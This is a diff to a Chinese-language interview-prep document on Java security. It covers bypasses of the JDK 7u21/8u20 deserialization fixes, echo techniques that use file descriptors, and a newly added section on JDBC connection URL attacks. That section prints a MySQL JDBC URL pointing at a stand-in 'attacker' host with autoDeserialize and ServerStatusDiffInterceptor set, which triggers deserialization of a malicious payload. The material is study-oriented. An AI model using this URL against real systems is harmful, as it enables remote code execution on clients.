@@ -182,7 +182,7 @@ LinkedHashSet.readObject()
 
 - 谈谈8U20反序列化（★★★★★）
 
-这是7U21修复的绕过（作者对该问题了解较浅，面试没有被问到过）
+这是7U21修复的绕过
 
 在`AnnotationInvocationHandler`反序列化调用`readObject`方法中，对当前`type`进行了判断。之前POC中的`Templates`类型会导致抛出异常无法继续。使用`BeanContextSupport`绕过，在它的`readObject`方法中调用`readChildren`方法，其中有`try-catch`但没有抛出异常而是`continue`继续
 
@@ -223,3 +223,19 @@ Y4er师傅提到的自定义类加载器配合RMI的一种方式
 原理类似`linux`的通杀回显，在`windows`中`nio/bio`中有类似于`linux`文件描述符这样的句柄文件
 
 遍历`fd`反射创建对应的文件描述符，利用`sun.nio.ch.Net#remoteAddress`确认文件描述符有效性，然后往里面写数据实现回显
+
+
+
+- 是否了解JDBC Connection URL攻击
+
+果我们可以控制`JDBC URI`就可将`JDBC`连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据
+
+指定`autoDeserialize`参数为`true`后`MySQL`客户端就可以自动反序列化恶意Payload
+
+使用`ServerStatusDiffInterceptor`触发客户端和服务端的交互和反序列化
+
+```text
+jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
+```
+
+以上是基本攻击手段，还有一些进阶的内容，例如`allowUrlInLocalInfile`和`detectCustomCollations`参数
